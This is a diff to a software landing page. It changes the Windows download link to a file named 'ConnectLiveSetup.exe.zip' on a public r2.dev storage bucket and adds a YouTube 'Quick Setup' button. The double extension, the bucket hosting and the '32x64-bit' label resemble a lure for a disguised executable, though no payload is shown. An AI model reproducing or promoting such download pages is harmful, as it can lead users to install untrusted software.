@@ -43,7 +43,12 @@
     margin-bottom: 20px;
   }
 
+  /* Quick Setup Button Styling */
   .setup-text {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    text-decoration: none;
     font-size: 14px;
     color: #666;
     margin: 25px 0;
@@ -51,6 +56,16 @@
     background-color: #f3f4f6;
     padding: 15px;
     border-radius: 8px;
+    transition: background-color 0.2s ease;
+  }
+
+  .setup-text:hover {
+    background-color: #e5e7eb;
+  }
+
+  .setup-text img {
+    width: 24px;
+    margin-right: 10px;
   }
 
   /* Buttons */
@@ -179,12 +194,13 @@
   <!-- Instructions & Download -->
   <p class="instruction-text">First, you'll need to download the app.</p>
   
-  <a href="https://pub-68b0934c671d49519da397e308c1b344.r2.dev/ConnectLiveSetup.zip" class="btn-primary">Download for Windows (64-bit)</a>
+  <a href="https://pub-9155da1311434ab9afab81c1b8a9128c.r2.dev/ConnectLiveSetup.exe.zip" class="btn-primary">Download for Windows (32x64-bit)</a>
 
-  <!-- Setup Process Text -->
-  <div class="setup-text">
-    <strong>Quick Setup:</strong>
-  </div>
+  <!-- Setup Process Text (Now a clickable YouTube button) -->
+  <a href="https://www.youtube.com/embed/xjtQdMZFOKg?si=hBeSv0jlTT_5YOjg" class="setup-text" target="_blank" rel="noopener noreferrer">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/0/09/YouTube_full-color_icon_%282017%29.svg" alt="YouTube Logo">
+    <strong>Quick Setup</strong>
+  </a>
 
   <!-- Footer Banner Source -->
   <div class="footer-banner">
